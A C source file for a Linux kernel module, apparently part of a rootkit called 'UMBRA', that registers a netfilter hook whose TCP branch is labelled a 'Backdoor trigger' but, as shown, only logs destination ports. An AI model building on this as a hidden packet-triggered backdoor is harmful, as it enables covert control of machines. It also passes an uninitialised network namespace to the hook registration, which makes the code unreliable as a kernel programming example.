#include "../include/netfilter_manager.h"

static struct net n;

unsigned int net_hook(unsigned int hook_num, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
    
    //Network headers
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;    
    struct sk_buff *sock_buff = skb;

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }

    ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        dport = htons((unsigned short int) tcp_header->dest);
        printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
    }

    return 1;

}

/**
 * The struct comes from netfilter
 */ 
static struct nf_hook_ops nf_hook_struct = {
    .hook	  = (nf_hookfn*)net_hook,
    //.owner	  = THIS_MODULE,
    .pf		  = NFPROTO_IPV4,
    .hooknum  = NF_INET_FORWARD,
    .priority = NF_IP_PRI_FIRST
};

/**
 * Registers predefined nf_hook_ops
 */ 
int register_netfilter_hook(void){
    int err;
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&n, &nf_hook_struct);
    #else
        err = nf_register_hook(&nf_hook_struct);
    #endif
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error registering nf hook");
    }
    return err;
}

/**
 * Unregisters predefined nf_hook_ops
 */ 
void unregister_netfilter_hook(void){
    #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
        nf_unregister_net_hook(&n, &nf_hook_struct);
    #else
        nf_unregister_hook(&nf_hook_struct);
    #endif

}